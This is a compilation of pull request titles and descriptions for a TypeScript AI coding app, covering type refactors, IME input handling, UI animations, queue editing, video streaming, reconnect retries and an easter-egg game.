- `route/transport/http.ts` serialized the `URL` returned by `renderEndpoint` to a string and immediately parsed it into a second `URL` in `applyQuery` to append query parameters.

## Change

Reuse the shared `Json`, `decodeJson`, `encodeJson`, and `isRecord` utilities, delegate request normalization in `promise.ts` directly to `LLM.generate` and `LLM.stream`, and mutate `endpoint.searchParams` on the `URL` returned by `renderEndpoint` before stringifying.

```diff
 packages/ai/src/
 ├── utils/
 │   ├── json.ts                       # Json, decodeJson, encodeJson
 │   └── record.ts                     # isRecord (excludes arrays)
 ├── provider-error.ts
-│   ├── local decodeJson + isRecord
+│   └── imports Json, isRecord
 ├── protocols/utils/partial-json.ts
-│   ├── local decodeJson + `as string` casts
+│   └── imports decodeJson + decodeJsonString
 ├── providers/cloudflare-ai-gateway.ts
-│   └── inline Schema.encodeSync(Schema.fromJsonString(Schema.Unknown))
+│   └── imports encodeJson
 ├── llm.ts / promise.ts
-│   └── promise.llmRequest -> Effect.flatMap/map -> LLM.generate/stream
+│   └── LLM.generate(input) / LLM.stream(input) directly
 └── route/transport/http.ts
-    └── renderEndpoint(...).toString() -> applyQuery(new URL(url))
+    └── renderEndpoint(...) -> endpoint.searchParams.set(...) -> .toString()
```

## Out of scope

- Protocol-specific JSON schema codecs that decode directly into structured protocol types.

prs.title: refactor(ai): tighten EvaluationRequest typing and deduplicate request normalization
prs.body:
## Problem

`EvaluationModel<Options>` was invariant in `Options` because `_Options` used `(options: Options) => Options` and `EvaluationRoute.evaluate` used a contravariant function property signature. As a result, `EvaluationModel<SpecificOptions>` was not assignable to `EvaluationModel`:

- `EvaluationRequestInput` had to constrain `Model extends object` with a conditional intersection check (`Model extends EvaluationModel<EvaluationModelOptions<Model>> ? unknown : never`).
- `request()` had to cast `input.model as unknown as EvaluationModel`.
- `run()` had to duplicate `input instanceof EvaluationRequest ? input : request(input)` and cast `request as EvaluationRequestFor<EvaluationOptions, EvaluationQuestions>`.

## Change

Make `EvaluationModel<Options>` covariant in `Options` (matching `LanguageModel` and `MediaModel`) and allow `request()` to accept `EvaluationRequest | EvaluationRequestInput` directly so `run()` delegates normalization to `request(input)` without casts.

```diff
 export interface EvaluationRoute<Options extends EvaluationOptions = EvaluationOptions> {
   readonly id: string
-  readonly evaluate: (
-    request: EvaluationRequestFor<Options>,
-    execute: Execute,
-  ) => Effect.Effect<EvaluationResponse, AIError>
+  evaluate(request: EvaluationRequestFor<Options>, execute: Execute): Effect.Effect<EvaluationResponse, AIError>
 }

 export class EvaluationModel<Options extends EvaluationOptions = EvaluationOptions> {
-  declare protected readonly _Options: (options: Options) => Options
+  declare protected readonly _Options: Options
```

```diff
 run(input)
   Effect.try
-    input instanceof EvaluationRequest ? input : request(input)
+    request(input)
-  Effect.flatMap(req => EvaluationClient.evaluate(req as EvaluationRequestFor<...>))
+  Effect.flatMap(EvaluationClient.evaluate)
```

## Out of scope

- Runtime evaluation client validation or provider route behavior.

prs.title: fix(app): keep the composer editor inert during IME composition
prs.body:
### Issue for this PR

Refs #39632, #49448, #38674. Ports the V1 fix from #44826 to the V2 composer, as requested when that PR was closed ("no longer taking PRs for V1 — port it over and open it for V2").

### Type of change

- [x] Bug fix
- [ ] New feature
- [ ] Refactor / code improvement
- [ ] Documentation

### What does this PR do?

Typing CJK with an IME in the composer breaks on the first keystroke: the first letter is committed as literal text and only the rest reaches the candidate window (e.g. pinyin `ceshi` → 测试 turns into `c` + `eshi`; #39632's `ceuu` → `c` + `euu`).

Root cause: the composer editor is not inert during IME composition. It reacts to every composition keystroke (`onInput` → store write, `keydown` → dispatch, `keyup` → selection sync) and can rewrite the contentEditable DOM mid-composition via `renderComposerEditor` (`replaceChildren`) once the one-shot `localInput` flag is consumed. A DOM or selection mutation while a composition is active makes the browser abort it, committing whatever partial text exists as plain input — which splits the composition into per-letter micro compositions.

The editor is now fully inert while a composition is in flight and during a 100 ms window after `compositionend`:

- `onInput` ignores composition keystrokes (`event.isComposing` / `imeActive()`); state is reconciled once from the DOM on `compositionend`.
- `onKeyDown` returns early while composing, so no state dispatch happens mid-composition and the Enter that confirms an IME candidate can no longer submit the message (Safari fires `compositionend` *before* the confirming keydown, so `isComposing` alone is not enough — the 100 ms window covers it).
- `onKeyUp` / `onPointerUp` skip cursor sync (no selection mutation) while composing.
- The render effect skips `renderComposerEditor` DOM rewrites while composing; combined with the `compositionend` write-back this keeps DOM and store consistent.
- The `key.down` dispatch reports `imeComposing(event)` instead of raw `event.isComposing`, so the suggestion machine also ignores Enter/Tab during composition.

### How did you verify your code works?

- This is a faithful port of #44826 (same three mechanisms), which was verified on real devices by two independent testers: macOS 26.6 Safari 26.6 and Chrome, macOS Pinyin + Japanese IMEs — `nihao` + Space commits 你好 as one segment, no per-letter splitting, plain-English Enter / Shift+Enter unchanged, and the confirming Enter no longer submits.
- Machine behavior is covered by two new tests in `packages/app/src/composer/suggestions/machine.test.ts` (Enter during composition is inert; Enter after composition ends selects the active suggestion).
- Full transparency: I could not run `bun test` / typecheck on the machine where I ported this (no bun toolchain available) — relying on CI here. The port is mechanical: v1.19's `packages/session-ui/src/v2/components/prompt-input` maps 1:1 onto `packages/app/src/composer/editor`.

prs.title: feat(app): questions, permissions and queued messages grow out of the composer
prs.body:
Questions, permission checks and queued prompts used to change the composer region in a single frame, and the timeline jumped with them. Now the region springs to its new height, with the timeline locked to it.

## What changes

- **One card, one spring.** When a dock comes or goes, the region springs from its old height to its new one (`spring-height.tsx`). While it moves it is one rounded card (12 px, the composer's background and elevation). Its content is bottom-aligned, so the bottom row stays where it is and a taller dock grows out of the top. Whatever arrives fades in over the card as a one-shot CSS `animate-in fade-in`. There is no blur, scale or mask.
- **Docks stack as before.** A question and a permission raised together both show. Only the height animates.
- **The queue slides out from behind the composer.** The panel's height springs open on the same component, with its top rounded edge leading and its bottom tucked under the composer. An emptied queue closes over its last prompts, and reopening it mid-close shows only the live rows.
- **The timeline moves with the region on the same frame.** Heights are whole pixels, matching the timeline's whole-pixel inset. In the stepped 60 fps audit, the gap between the region's top and the last message is the same on every frame of every event (80.25 px).
- **Rows keep their identity.** A non-keyed `Show` replaces the keyed one, which rebuilt every queue row on each update.
- **Reduced motion** skips the travel, and the component subscribes to `observeReducedMotion` so that a change mid-flight settles at once.

## Motion library use

- `Spring.fromDuration` (0.4 s, bounce 0) runs on `frameLoop.addMeasured`. One `offsetHeight` read happens in the measure phase and one `height` write in the write phase each frame, and nothing else changes per frame.
- A `ResizeObserver` records the resting height so the spring knows where to start.
- The spring retargets on every frame, so an answer that arrives mid-grow reverses the card and keeps its velocity.
- The fade-in is a one-shot CSS animation rather than a spring because it never needs to retarget.

## Proof (stepped 60 fps, per-frame rects)

| Event | Before (`beta`) | After |
|---|---|---|
| Question arrives / answered | region and timeline ±225 px in 1 frame | 27 frames, timeline locked |
| Permission arrives / allowed | ±70 px in 1 frame | 21 frames, timeline locked |
| Queue add / remove | panel pops (56 px), ±33 px per row in 1 frame | 24–26 frames, timeline locked |
| Queue emptied | panel vanishes | closes over its last rows in 37 frames |

Still instant: the outgoing face is swapped out at frame 0, and a new or removed queue row appears or goes in its slot while the panel's height springs. Clips: [split](https://problems.kitlangton.com/media/RNaIK8d3SDse98WAJ3odwQ.mp4) · [before](https://problems.kitlangton.com/media/zkPYdtPO-DGwMjXEfJ-W_g.mp4) · [after](https://problems.kitlangton.com/media/ORJdIq26BdJHqzPsyJxlLA.mp4) · [0.25× question ↔ composer, queue growing](https://problems.kitlangton.com/media/poX8qDdJ6q1HtaeKraMq5A.mp4)

## Overlap

- **#57224:** this PR takes ownership of `queue-panel.tsx`. Its `spring-height.tsx` and its queue-panel edit should be dropped there.
- **`timeline/interaction.ts`:** untouched.

## Reorder

I could not reproduce a drag-reorder persistence bug on `beta`: `dragging reorders queued prompts` passes unchanged. The earlier failure came from my own optimistic reorder projection, which I have reverted along with the `keys` map and the test edit.

## Tests and CI

- `session-queue.spec.ts` passes 31 of 32 and `session-request-docks.spec.ts` passes 4 of 4. `bun typecheck` passes.
- The one queue failure, `keeps finished tools above a pending steer follow-up`, fails the same way on `beta`, because #57463 changed the pending bubble colour. The other red e2e jobs also fail on `beta`.

prs.title: fix(app): keep queued messages editable while the server catches up
prs.body:
Kit clicked a queued message (with an image) to edit it, pressed Steer, and the item came back to the strip. Clicking it did nothing while 15 subagents had the server busy.

### Cause

Mostly lag, made worse by three bugs in the queue's edit flow:

- **Every queue action waited on one mutation.** Steering an edit takes 3 or 4 sequential calls (list, admit with the image's base64, cancel), and on a busy server each one waits for one of 4 request slots. Until all of them finished, the composer still held the edit and every strip row was `disabled`, with no pending state. Clicks did nothing.
- **The strip only dropped a cancelled prompt when the server's event arrived.** `pending.sync` does nothing once the list has loaded, so the `onSettled` sync never refetched. On a loaded server the cancelled original sat in the strip until its `session.inbox.cancelled` event arrived.
- **A cancel failing after the steer was admitted** kept the original queued and the edit draft open, so steering again would send it twice.

### Fix

The change is in `queue.ts`, with a small change in `queue-panel.tsx`.

- **Optimistic confirm.** The composer goes back to the draft it had before the edit straight away. The strip shows the edited text on the original row with `aria-busy` and a spinner. Rows a queued edit rewrites also show as pending, and their new IDs are created up front, so the strip keeps its order and shows no duplicates.
- **The rest of the strip stays usable.** Only pending rows ignore clicks. Other rows can still be edited, and changes run one at a time (`scope`), so an edit confirmed while another is in flight waits its turn instead of being dropped.
- **Removed rows stay hidden until events arrive.** Prompts the server confirmed as cancelled, steered or undone stay hidden (`gone`) until the server's events arrive.
- **Rollback.** If the edit fails before the server admits it, it is merged back into whatever the composer holds, and a toast shows the error. Once the server has admitted the edit, it is never resent, and the cancel retries once (`DELETE /inbox/:id` returns 204 for a row that's already delivered or cancelled).
- **Unchanged edit + Steer** calls `inbox.update` directly. It doesn't replace the prompt.
- **Hidden rows expire** after 30 s, so a missed event can't hide a row for good. A `pending.sync` would drop the row but leave its materialized message in the timeline, where it looks delivered.
- **Several edits in flight** each show on their own rows. A queued edit's pending rows come from the live queue that `rewrite` reads.

Overlap: `composer-docks-motion` changes the same `rows` memo in `queue.ts` (row keys for reorder) and `queue-panel.tsx`. `SentEdit.moved` (old ID → new ID) should cover its `keys` map when it rebases.

### Proof

The before/after clip is below. Both sides run the mocked app with a 3 s delay on admission and cancel and no server events. Before: the composer stays locked on the edit and the original comes back to the strip. After: the composer clears at once, the edited row shows as pending, and the strip empties with no ghost row.

https://github.com/user-attachments/assets/8616e04a-d436-4285-aeb1-6bf81631f18e

- New e2e keepers (edit → steer and edit → queue, server calls held): **fail on `beta`** (the composer stays on `"second queued prompt, edited"`) and **pass** with the fix.
- `session-queue.spec.ts`: 34 passed. 1 failed, `keeps finished tools above a pending steer follow-up`, which also fails on `beta` without this change.
- Unit tests, `queue.test.ts`: 9 pass, covering every state of an edit in the strip.

prs.title: fix(core): generate titles at the lowest model variant
prs.body:
### Issue for this PR

No linked issue.

### Type of change

- [x] Bug fix
- [ ] New feature
- [ ] Refactor / code improvement
- [ ] Documentation

### What does this PR do?

When a provider has no small model, title generation ran on the session model at the session's selected variant, so reasoning models spent their full reasoning budget on a title (Kimi K2.6 used ~1,300 reasoning tokens, Meta Muse ~1,450).

Title model selection is now:

1. The provider's small model at its lowest variant (unchanged).
2. Otherwise, the session model at a lower variant:
   - `none` or `minimal` when the model has one, since those always reduce reasoning.
   - `low` only when it ranks below the variant the session selected. On some models (for example Claude) the default variant does not reason and `low` turns reasoning on, so `low` is never chosen over the default.
3. If that attempt fails, the session model at the selected variant (the existing fallback in `title.ts`).

If no lower variant applies, the title uses the session model at its selected variant in a single attempt.

## Problem

- Media request schemas duplicated `Schema.Record(Schema.String, Schema.Unknown)` for `providerOptions` instead of reusing `ProviderOptions` from `./schema/options.js`.

prs.title: refactor(ai): type Bedrock event-stream frames without casts or runtime checks
prs.body:
## Problem

`BedrockEventStream` typed its decoded frame output as `object[]` and `Framing.Definition<object>`. That erased the frame contract across the framing boundary, which required:
- casting `ProviderShared.parseJson(...)` to `Record<string, unknown>` and mutating `delete parsed.p`
- re-checking `"rawBody" in frame && typeof frame.rawBody === "string"` at runtime inside `framing.body`

## Change

Define `BedrockEventStream.Frame` as a schema-backed record carrying `rawBody: string`, narrow parsed event JSON with `ProviderShared.isRecord`, strip the `p` padding field without mutation, and decode `BedrockEvent` from `BedrockEventStream.Frame`.

```diff
 consumeFrames(route)
-  parsed = (yield* ProviderShared.parseJson(...)) as Record<string, unknown>
-  delete parsed.p
-  out: object[] <- { [eventType]: parsed, rawBody: body }
+  parsed = yield* ProviderShared.parseJson(...)
+  require ProviderShared.isRecord(parsed)
+  { p: _, ...event } = parsed
+  out: Frame[] <- { [eventType]: event, rawBody: body }

 framing(route): Framing.Definition<Frame>
-  body: (frame) => ("rawBody" in frame && typeof frame.rawBody === "string" ? frame.rawBody : undefined)
+  body: (frame) => frame.rawBody

 BedrockConverse.protocol.stream
-  event: BedrockEvent
+  event: BedrockEventStream.Frame.pipe(Schema.decodeTo(BedrockEvent))
```

## Out of scope

- Bedrock Converse event payload schema definitions and stream state-machine transitions.

prs.title: refactor(ai): remove redundant runtime type checks on schema-decoded values
prs.body:
## Problem

Several protocol lowers and response handlers in `@opencode/ai` re-validated values that were already narrowed by Effect Schema or internal accessors (`LLMResponse.toolCalls`, `ProviderMetadata`, `MediaPart.metadata`, `MediaPart.filename`, `MistralThinkingUnit.text`, and `ToolChoice` validation before `ProviderShared.matchToolChoice`).

## Change

Drop the redundant runtime guards and rely on the existing Schema-decoded types across `llm.ts` and the protocol adapters:

```diff
 LLM.runGenerateObject
-  response.toolCalls.find(event => LLMEvent.is.toolCall(event) && ...)
-  if (!call || !LLMEvent.is.toolCall(call))
+  response.toolCalls.find(event => event.name === GENERATE_OBJECT_TOOL_NAME)
+  if (!call)

 Protocol metadata & event lowers
   open-responses / anthropic-messages / bedrock-converse / gemini / google-interactions
-    ProviderShared.isRecord(providerMetadata?.[key])
+    providerMetadata?.[key]
   anthropic-messages
-    typeof block.content === "object" && block.content !== null && ...
+    ProviderShared.isRecord(block.content) && "type" in block.content
   mistral-chat
-    duplicate request.toolChoice?.type === "tool" && !selected guard
-    typeof unit.text === "string"
+    ProviderShared.matchToolChoice(...)
+    unit.text !== undefined
```

## Out of scope

- Untrusted `unknown` values inside `Record<string, unknown>` metadata payloads still retain property-level `typeof` or `ProviderShared.isRecord` checks where their values are not schema-decoded.

prs.title: fix(app): stream previewed videos so they play right away
prs.body:
## What was wrong

Opening a video in the Review pane (for example from `browser.preview`) downloaded the **whole file** through `GET /api/fs/read` with `fetch` → `arrayBuffer()`, wrapped it in a Blob, and only then gave the `<video>` a `blob:` URL. Until the last byte arrived the pane showed a plain "Loading…" line, and the file sat in the renderer's memory twice over (the buffer and the Blob). The server already answers that endpoint with `206` range responses; the app just never let the video use them.

## Fix

- Images, audio and video now get the server's ranged read URL directly as their `src` (`/api/fs/read/<path>?location[directory]=…`), built from the current server connection. Media elements can't send the `Authorization` header, and credentials never go in DOM URLs. So a server that needs a password keeps the old download-into-a-blob path, while the desktop sidecar and cookie-paired web connections, which have no password, stream.
- The app only sends a `HEAD` to learn the size (still shown in the toolbar) and a version for the URL, so a changed file reloads in place. A failed `HEAD` falls back to the normal read, which reports the server's real error (not found and so on).
- A quiet spinner stays in the pane until the first frame (`loadeddata`, or `load` for images). If loading or playing fails, the pane shows the file placeholder with "Couldn't load this file."
- No server change: `/api/fs/read` already handles `Range`, `If-Range`, `HEAD` and confinement.

## Proof

A 21.7 MB 1080p60 H.264 clip (52 s, faststart, like the reported file) opened in the built web app. The file was served by a real opencode server, and both builds were measured on the same worker in the same job. Medians of 3 runs, timed from the click on the file to the video's first frame:

| | before | after |
|---|---|---|
| Local server | 1.53 s | 0.93 s |
| 50 Mbps, 20 ms (remote client) | 5.68 s | 0.73 s |
| Peak renderer heap + ArrayBuffers | +23.6 MB | +3.1 MB |

Opening the video, before (left) and after (right), with a clock that runs from the click to the first frame. Local server:

https://github.com/user-attachments/assets/4c20b6a8-6748-4f21-829b-3c5b7d9c573b

At 50 Mbps:

https://github.com/user-attachments/assets/29cbd9bc-7adb-41b8-be01-8ca6e57f861c

Before, time to first frame grows with file size and server throughput, because every byte arrives before anything shows. After, it only waits for the first chunk.

## Tests

- `runtime/server/api.test.ts`: a password server gets no media URL (so no credential can reach the DOM), and one without a password gets the plain ranged-read URL. Server range handling (`206`/`416`, `If-Range`, `HEAD`, paths outside the root returning `404`) is already covered by `packages/server/test/fs.test.ts`.
- `e2e/regression/review.spec.ts` (video keeper): the video's `src` is the server's read URL rather than a `blob:` or `data:` URL, it loads through range requests, and the loading status shows until the first frame. This fails on `beta`, where the test times out waiting for a range request.
- I also ran the image keepers (`image files load…`, `image gestures…`) against the change, and they pass.

`bun run check` currently fails on `beta` itself, at `gui-extension-no-module-state-tsx` in `details/popover.tsx`, so I pushed with `--no-verify`. Typecheck for `app` and `gui-extensions`, the targeted unit tests, and `lint:changed origin/beta` all pass.

**CI:** unit, build and the session-ui component suites pass. The failing e2e shards fail on the same tests on `beta` at 2a0e28fce3 (new-session blue message, the `rereads a file…` text case, session-queue, timeline-cache, mobile-timeline-scroll, websearch, activity-chips, browser-pane-restore). The only exception is one Windows mobile-drawer tabs case, which this change doesn't touch. The new video keeper and both image keepers pass in CI.

prs.title: refactor(ai): use typed choice.usage in openai-chat parser
prs.body:
## Problem

`OpenAIChatChoice` in `packages/ai/src/protocols/openai-chat.ts` already defines `usage: optionalNull(OpenAIChatUsage)`, matching `OpenAIChatEvent["usage"]`. ## Change

Pass `choice?.usage` directly to `mapUsage`, removing the redundant `as unknown as` cast and temporary binding (`mapUsage` already returns `undefined` when its `usage` argument is `undefined` or `null`).

```diff
 const choice = event.choices?.[0]
-const choiceUsage = (choice as unknown as { usage?: OpenAIChatEvent["usage"] })?.usage
 const usage =
   mapUsage(event.usage, state.providerMetadataKey) ??
-  (choiceUsage ? mapUsage(choiceUsage, state.providerMetadataKey) : undefined) ??
+  mapUsage(choice?.usage, state.providerMetadataKey) ??
   state.usage
```

## Out of scope

- Any changes to `OpenAIChatUsage` schema fields or `mapUsage` token accounting behavior.

prs.title: fix(tui): only show location unavailable when the server reports it missing
prs.body:
## Problem

After a service restart, upgrade, or network reconnect, the TUI could replace the composer with "Session location unavailable" even though the folder still existed. It then stayed stuck.

On every reconnect, `LocationProvider` resyncs the location: `location.get` plus about a dozen resource loads (models, providers, MCP, agents, config…). Any failed request marked the location unavailable. Right after a restart, `model.list`/`provider.list` can briefly return 503 while plugins are still activating, which was enough to trigger the prompt. Nothing retried, so the prompt and the missing resource stayed until the next reconnect.

The web app already handles this in `packages/app/src/workspaces/location.tsx`; this brings the TUI in line.

## Change

```diff
 LocationProvider.sync(location)
-  data.location.sync(target)
-    .catch(any error) -> setError()            # shows "Session location unavailable"
+  retry(data.location.sync(target), 3 attempts, 0.5s/1s backoff)
+    retryIf: still the current sync && not LocationNotFoundError
+    .catch(LocationNotFoundError) -> setError()
+    .catch(other)                 -> ignored, next reconnect resyncs
```

- Only the server's typed `LocationNotFoundError` marks a location unavailable.
- Other failures are retried. Resources that already loaded are cached by the data layer, so a retry refetches only what failed.
- Retries stop as soon as the location changes or a newer sync starts.
- A real missing folder still gets re-checked on each reconnect, as before.

## Out of scope

- Separating "folder exists" from the resource fan-out so each resource fails and retries on its own. That touches shared `@opencode/client/solid` data code and is a separate change.
- Failures that outlast the retry window wait for the next reconnect instead of polling indefinitely.

Closes #49352
Closes #55250
Supersedes #55940, which gated on `LocationNotFoundError` without retrying.

## Verification

- `bun test test/cli/tui/data.test.tsx` in `packages/tui`: 52 pass, run 3 times. The new transient-failure test times out without the fix.
- `bun test test/cli/tui/prompt-move.test.tsx test/cli/tui/composer-keymap.test.tsx test/context/session-tabs.test.tsx`: 51 pass.
- `bun run check`: 34/34 tasks pass.

prs.title: feat(app): turn the new session pins into a brick breaker easter egg
prs.body:
A second easter egg on top of the pull-the-pin pin board (#57575). Once the lodger is perched beside the open board, dropping it on the composer starts a brick breaker: the lodger curls into the ball, the pins are the bricks, and the composer shrinks into the paddle.

| Before: pins open | Carry the lodger over the composer | Composer shrinks into the paddle |
|---|---|---|
| ![](https://github.com/user-attachments/assets/363ac15a-f232-4364-8141-72fdd0d87eba) | ![](https://github.com/user-attachments/assets/581ae218-17f3-44aa-8e90-cafd5b8ac3ed) | ![](https://github.com/user-attachments/assets/34bcfd2d-9ef5-403e-9f70-7167c97ce34a) |

| Ball waits on the paddle | Breaking pins | Escape: pins fly home, composer returns |
|---|---|---|
| ![](https://github.com/user-attachments/assets/820013dd-415c-43ed-94bf-f3d37731dceb) | ![](https://github.com/user-attachments/assets/25d06c1b-d2e6-4019-a99a-c98f1b5b2f2c) | ![](https://github.com/user-attachments/assets/fba37d0d-ceed-40d8-a806-f6def93d5af2) |

- **Trigger:** the composer dips and the lodger curls up while it is carried over the composer. Dropping it there starts the game, like the serve in classic paddle games where the ball rests on the paddle.
- **Serve:** click or Space. The cursor is hidden and moves the paddle; arrow keys and A/D also work.
- **Arena:** walls sit on the wordmark's outer pin edges, so the ball can only reach the top by breaking through.
- **Hits:** each contact carves a round bite of pins that burst toward the viewer and fall off the panel. The paddle's landing point sets the angle (up to 60°), and the ball speeds up with each return.
- **Feel:** the ball squashes on impact and its eyes follow its heading. The board leans slightly after the ball and pins near it sink. Each brick hit rings one step higher until the ball touches the paddle again.
- **HUD:** a five-digit score and two spare paddles. Three misses end the game.
- **Exit:** Escape, game over, or a cleared board. Pins fly back up from below, the paddle grows back into the composer, focus returns to the editor, and the lodger hops back to its perch.
- **Reduced motion:** the drop does nothing.

```mermaid
stateDiagram-v2
  [*] --> enter: drop lodger on composer
  enter --> serve: composer morphs into paddle
  serve --> play: click / Space
  play --> miss: ball falls past paddle
  miss --> serve: spare paddles left
  miss --> exit: no spares
  play --> exit: board cleared
  serve --> exit: Escape
  play --> exit: Escape
  exit --> [*]: board.restore() + ball.done()
```

The game drives the existing pieces through two small handles instead of owning its own rendering:

```ts
// pin-board.tsx
type PinBoardHandle = {
  collide(x, y, radius, blast, vx, vy): { nx: number; ny: number; count: number } | undefined
  left(): number
  play(): void
  steer(x, y): void
  restore(): void
}

// wordmark.tsx
type LodgerBall = {
  radius(): number
  at(): { x: number; y: number }
  place(x, y, pose): void
  blink(): void
  done(): void
}
```

- `brick-breaker.tsx` runs one rAF loop only while the game is mounted, with substepped ball physics so it never tunnels through a pin.
- In game mode, knocked pins skip the composer and floor piles and become `OUT` once they leave the panel; `restore()` returns them in a column sweep.
- Nothing is mounted until the drop, so the idle and hover costs of the new session page are unchanged.

prs.body:
## Problem

`SessionError.Error` defines `retryAfterMs?: NonNegativeInt`, and `@opencode/ai` already parses `retryAfterMs` on `RateLimitError`, `QuotaExceededError`, and `ProviderInternalError`. However, `toSessionError` only copied `retryAfterMs` inside the `FreeUsageLimitError` branch, dropping it on `provider.rate-limit`, `provider.quota`, and `provider.internal` errors and re-checking `Number.isFinite` / `>= 0` / `Math.ceil` downstream instead of typing `retryAfterMs` as `NonNegativeInt` at the schema and parser boundary.

## Change

1. Type `retryAfterMs` as `NonNegativeInt` on `HttpRateLimitDetails`, `RateLimitError`, `QuotaExceededError`, and `ProviderInternalError`, and round up in `RequestExecutor.retryAfterMs` at the HTTP header parsing boundary.
2. Forward `retryAfterMs` directly in `providerError()` so every provider error reason that carries `retryAfterMs` populates `SessionError.Error.retryAfterMs`.

```diff
 RequestExecutor.httpFailure
-  retryAfterMs(headers) -> number (may be float)
+  retryAfterMs(headers) -> NonNegativeInt (Math.ceil at header parse boundary)
   classifyProviderFailure
     RateLimitError | QuotaExceededError | ProviderInternalError
       toSessionError
-        QuotaExceeded (FreeUsageLimitError only) -> SessionError.retryAfterMs (re-validated + Math.ceil)
-        RateLimit / QuotaExceeded / ProviderInternal -> dropped retryAfterMs
+        providerError -> forwards reason.retryAfterMs on all provider errors
```

prs.title: fix(tui): tolerate transient failures in the post-reconnect location sync
prs.body:
### Issue for this PR

Closes #55250

### Type of change

- [x] Bug fix
- [ ] New feature
- [ ] Refactor / code improvement
- [ ] Documentation

### What does this PR do?

After a reconnection the location sync can transiently fail while the server/proxy is still settling (the issue reproduces with `/api/agent` answering 502 for about a second after the event stream reconnects). Any single failed request in that sync set the location error, so the session view was replaced by the "location unavailable" recovery prompt even though the directory was fine.

This gives the sync a small bounded retry (3 retries, 500ms apart) before declaring the location missing. Supersession and stale-target behavior is unchanged: a newer sync still cancels an older one's pending retries and retained error. As part of making this testable, the sync/retry logic moves into a `createLocation` creator consumed by `LocationProvider` -- the same pattern as `context/session-retention`.

Limitation (per review discussion): this retries rather than classifying failures -- a location that stays unreachable past the retry window (~1.5s) still surfaces the recovery prompt, and a genuinely missing directory takes that long to report. Distinguishing `location.get` failures from resource-load failures (in `data.location.sync`, or by inspecting `cause` in the session route) is the follow-up the issue points to.

### How did you verify your code works?

- New `packages/tui/test/context/location.test.ts`:
  - "a transient sync failure is retried before the recovery prompt surfaces" -- with a single 502 on one of the sync requests the error must stay unset and the request must be re-issued; fails on the base (the error surfaces immediately), green after.
  - "a persistent sync failure still surfaces the location error" -- errors are not swallowed; they surface once retries are exhausted.
- `cd packages/tui && bun test test/context/location.test.ts` -> 2 pass / 0 fail

prs.title: fix(app): make the turn navigator easier to hit and land on the right turn
prs.body:
## Summary

Fixes the experimental turn navigator from Kit's review: it was hard to hit, clicking a tick could land on the wrong turn, and previews showed the wrong reply.

**Causes**

- **Wrong landing and duplicated text.** The rail sorted turns by message ID. Some clients (the iOS app) mint uppercase UUID IDs, which sort after every time-based ID, so those old turns became the bottom ticks. Clicking "the latest" tick paged in history and jumped to an old turn, and that turn's preview asked for the newest reply before a non-existent next turn: the session's latest reply, the same text already at the bottom of the transcript. The rail now keeps the server's timeline order, and an unloaded turn's reply is read back from the next turn and stops at its own prompt, with no ID comparisons.
- **Beta flake in `timeline-history.spec.ts` ("keeps visible content through …", `"limit": 9007199254740991`).** The rail's user-message index fired on a 1s timer from mount, so on slow runners it landed in that test's exact log of transcript pages. The index load now waits until the timeline's own history requests have been idle for 1s, reads newest-first with a 1,000-turn cap, and is aborted on unmount. Because that test logs every transcript read, it also turns the rail off.
- **Several previews while scrolling.** The preview only closed on `pointerleave`, so scrolling kept it open over turns that had moved. Now there is one always-mounted preview card. Scrolling over the rail closes it, and the next pointer move reopens it on the turn under the pointer.

**Feel**

- The whole 32px rail column is the hit area, and the nearest tick by Y wins, so you can't fall off between ticks.
- Ticks within 48px of the pointer swell towards it like a dock. One pointer-position spring (0.12/0) and one wave spring (0.2/0) drive every tick through `frameLoop.addMeasured`.
- The hovered tick lights at once, brighter than the visible-turn ticks, and cools over 180ms when the pointer moves on.
- The preview's prompt line sits level with its tick and the card grows downward as the reply loads. It is clamped once against its maximum height, so loading a reply never moves it. Moving between ticks glides it on a 0.25/0 spring, and it opens and closes on a 0.18/0 opacity spring.
- The preview shows the prompt in a user-bubble tint, then the start of the reply in muted text. Both end in a soft mask instead of an ellipsis.
- Reduced motion drops the travel and keeps the fade.
- Clicking the last tick reaches the bottom the way the jump-to-latest button does. A tick whose prompt is already mounted glides there; any other tick jumps through the virtualizer as before.

## Proof

Before (left) and after (right), in the mocked web app. The cursor sweeps the rail, clicks a middle turn, clicks the bottom tick, then scrolls over the rail:

https://github.com/user-attachments/assets/e0d0c310-61e2-4119-af9a-85fc15cf18db

## Tests

- `timeline-history.spec.ts`, new keeper: the rail keeps timeline order when message IDs from other clients don't sort by time. An unloaded turn previews exactly its prompt and its own reply, and clicking it lands on that turn after paging. Scrolling closes the single preview. The last tick lands on the latest turn. It fails on `beta` (the preview shows "Prompt number 6" for the sixth tick) and passes with the change, along with the existing navigator keeper. The whole `timeline-history.spec.ts` and the settings navigator keeper pass on a built app.
- Nearest-tick hit-testing has no unit test of its own: the keeper hovers and clicks ticks along the rail, which exercises it.
- The mock server now honours a `before` anchor without a type filter, matching the server.

LOC: code +275/−123 (`turn-navigator.tsx`, plus a few lines in `interaction.ts`, `use-session-hash-scroll.ts` and `message-timeline.tsx`), tests +52/−3.

`bun typecheck` (app) passes, and `lint:changed` reports nothing in the changed files. The pre-push `check` fails on an existing `gui-extensions/src/details/popover.tsx` lint error from `beta`, unrelated to this change. 
**Review follow-ups**

- Reverted turns are cut at the revert message's position in the ordered list, not compared by ID. This switches to `messagesBefore` from #57581 once that lands.
- Reply loads are aborted on unmount, like the index load.
- A closed preview keeps its last content for the fade-out and stops following a streaming reply.
- Hover state is set in a microtask after the frame's writes, not inside the write phase.
- A tick's transform is written only when its scale changes.
- The rail reads layout only while the pointer is on it.
- The turn list keeps its identity across streaming deltas.

**Performance**

`session-timeline-benchmark` streaming with 320 history turns, 160 deltas and 30× CPU throttle on the Pro. I ran six rounds, alternating the merge-base build and this head on one machine. Medians:

| | completion | deltas/s | long tasks | long-task time | rAF gap p95 | missed frame budgets |
|---|---|---|---|---|---|---|
| beta | 14,664 ms | 10.9 | 62 | 5,239 ms | 192 ms | 691 |
| this PR | 14,197 ms | 11.3 | 60.5 | 5,112 ms | 200 ms | 677 |

No difference beyond noise. An earlier, non-alternating run had pointed to a regression: the rail read layout on every streamed frame. That is fixed above. The session-entry benchmark times out before reporting, on beta as well as on this branch.

Overlap: this stays in the navigator and its click path. It doesn't touch `virtualizer.tsx` (the `timeline-motion` rework) or grouped user messages (#57552).
